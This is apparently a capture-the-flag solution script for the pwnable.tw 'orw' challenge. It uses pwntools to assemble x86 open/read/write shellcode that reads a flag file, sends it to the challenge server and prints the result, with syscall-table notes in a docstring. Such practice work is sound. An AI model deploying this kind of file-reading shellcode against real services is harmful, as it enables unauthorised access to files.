"""
	syscall reference : http://syscalls.kernelgrok.com/
	psuedo code :
	char *file = '///home/orw/flag';
	sys_open(file, 0, 0);               first 0 stand for O_RDONLY = read only; second stand for mode, can change someone's permissions on read,write or execution
	sys_read(3, file, 0x30);
	sys_write(1, file, 0x30);	
	
        Name           eax     ebx                          ecx                    edx
3	sys_read       0x03    unsigned int fd	            char __user *buf	   size_t count	
4	sys_write      0x04    unsigned int fd	            const char __user *buf size_t count
5   	sys_open       0x05    const char __user *filename  int flags	           int mode



    open file => read file => write to stdout
"""

from pwn import *

s = remote('chall.pwnable.tw', 10001)

shellcode = ''

shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f; mov ebx,esp; xor edx,edx;int 0x80;')
#ecx = 0;  eax = 0x05; /*save thins in esp*/ "g a l f / w r o / e m o h / / /" ; ebx = esp ; edx = 0; system call;

shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x30;int 0x80;')

shellcode += asm('mov eax,0x4; mov ebx,0x1;int 0x80;')

def orw():

	recv = s.recvuntil(':')

	s.sendline(shellcode)

	flag = s.recv()

	print flag

orw()



